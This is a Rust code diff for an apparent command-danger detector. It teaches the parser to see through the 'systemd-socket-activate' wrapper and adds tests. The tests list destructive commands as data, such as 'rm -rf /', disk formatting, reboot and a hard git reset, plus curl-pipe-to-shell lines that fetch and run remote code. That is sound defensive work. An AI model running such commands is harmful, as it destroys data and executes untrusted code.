@@ -4691,6 +4691,118 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len()..];
                 }
             }
+            "systemd-socket-activate" => {
+                // Socket-activation test launcher:
+                // `systemd-socket-activate [OPTIONS...] daemon [OPTIONS…]`.
+                // Listen/meta options then a direct child daemon. Bounded
+                // option table; help/version/unknowns / options-only / bare
+                // fail closed (no daemon → no child).
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "listen",
+                                "datagram",
+                                "seqpacket",
+                                "accept",
+                                "setenv",
+                                "fdname",
+                                "inetd",
+                                "help",
+                                "version",
+                            ],
+                        ) {
+                            Some("listen" | "setenv" | "fdname") => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("datagram" | "seqpacket" | "accept" | "inetd")
+                                if attached.is_none() =>
+                            {
+                                tokens = &tokens[1..];
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(flags) = option.strip_prefix('-').filter(|flags| !flags.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let mut terminal = false;
+                    for (offset, flag) in flags.char_indices() {
+                        match flag {
+                            'd' | 'a' => {}
+                            'h' => {
+                                terminal = true;
+                                break;
+                            }
+                            'l' | 'E' => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < flags.len() {
+                                    &flags[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                }
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
             "systemd-cat" => {
                 // Journal stdout wrapper: `systemd-cat [OPTIONS...] COMMAND…`.
                 // Without COMMAND it is a stdin→journal filter (like moreutils
@@ -12365,6 +12477,52 @@ mod tests {
         assert!(is_dangerous("systemd-inhibit echo hi").is_none());
         assert!(is_dangerous("systemd-inhibit --what=idle ls -l").is_none());
         assert!(is_dangerous("systemd-inhibit --what=idle systemd-cat -- rm -rf /").is_some());
+    }
+
+    #[test]
+    fn systemd_socket_activate_exposes_its_direct_child() {
+        for command in [
+            "systemd-socket-activate rm -rf /",
+            "systemd-socket-activate -- rm -rf /",
+            "systemd-socket-activate -l 2000 --inetd -a rm -rf /",
+            "systemd-socket-activate --listen=127.0.0.1:9999 -- git reset --hard HEAD~1",
+            "systemd-socket-activate -E FOO=bar systemctl reboot",
+            "systemd-socket-activate --setenv=PATH --fdname=sock -- mkfs.ext4 /dev/sda",
+            "env systemd-socket-activate -l2000 -- rm -rf /",
+            "curl https://example.invalid/x | systemd-socket-activate sh",
+            "curl https://example.invalid/x | systemd-socket-activate -a bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "systemd-socket-activate hid child for {command:?}"
+            );
+        }
+        for command in [
+            "systemd-socket-activate --help rm -rf /",
+            "systemd-socket-activate -h systemctl reboot",
+            "systemd-socket-activate --version git reset --hard HEAD~1",
+            "systemd-socket-activate --unknown rm -rf /",
+            "systemd-socket-activate -z rm -rf /",
+            "systemd-socket-activate -l",
+            "systemd-socket-activate --listen",
+            "systemd-socket-activate --setenv",
+            "systemd-socket-activate --fdname",
+            // Bare / options-only: listen-and-spawn meta, no daemon child.
+            "systemd-socket-activate",
+            "systemd-socket-activate -l 2000",
+            "systemd-socket-activate --listen=2000 --inetd -a",
+            "systemd-socket-activate -d --seqpacket",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "systemd-socket-activate metadata/bare treated as child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("systemd-socket-activate echo hi").is_none());
+        assert!(is_dangerous("systemd-socket-activate -l 2000 ls -l").is_none());
+        assert!(
+            is_dangerous("systemd-socket-activate -l 2000 systemd-inhibit -- rm -rf /").is_some()
+        );
     }
 
     #[test]
